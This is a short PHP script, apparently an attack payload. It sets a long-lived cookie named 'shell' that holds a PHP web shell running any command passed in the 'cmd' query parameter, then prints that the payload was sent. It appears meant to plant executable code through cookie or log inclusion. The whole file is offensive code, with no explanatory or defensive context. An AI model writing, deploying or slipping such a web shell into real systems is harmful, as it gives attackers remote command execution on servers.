<?php
header("Set-Cookie: shell=<?php system(\$_GET['cmd']); ?>; expires=Tue, 19 Jan 2038 03:14:07 GMT; path=/");
echo "Payload sent in cookie header!";
?>
